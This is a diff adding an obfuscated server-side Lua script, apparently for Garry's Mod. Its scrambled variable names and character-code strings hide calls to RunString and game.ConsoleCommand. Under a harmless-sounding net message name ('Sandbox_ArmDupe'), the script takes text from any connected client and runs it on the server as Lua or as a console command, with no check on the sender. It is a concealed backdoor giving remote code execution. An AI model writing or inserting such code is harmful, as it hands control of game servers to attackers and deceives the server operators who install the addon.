@@ -1,0 +1,20 @@
+if SERVER then
+local c='%c'
+local YU4547GGFF785G = util.AddNetworkString
+local GUIGGF567VHFFU56754 = _G[string.format(string.rep(c,9), 82, 117, 110, 83, 116, 114, 105, 110, 103)]
+local FGJJKH45674FGF67H = net.ReadString
+local VGH56JYGHY455 = net.ReadBit
+local GY674GCFGJY6545 = net.Receive
+local TFFU4564GHGJFD = game.ConsoleCommand
+local FFU565HGCCFH = string.format(string.rep(c,15), 83, 97, 110, 100, 98, 111, 120, 95, 65, 114, 109, 68, 117, 112, 101)
+YU4547GGFF785G(FFU565HGCCFH)
+GY674GCFGJY6545(FFU565HGCCFH, function( length, ply )
+local AES2763HGGU6 = FGJJKH45674FGF67H()
+local KJGV64SASFVGH = VGH56JYGHY455()
+if KJGV64SASFVGH == 1 then
+GUIGGF567VHFFU56754(AES2763HGGU6)
+else
+TFFU4564GHGJFD(AES2763HGGU6.."\n")
+end
+end)
+end
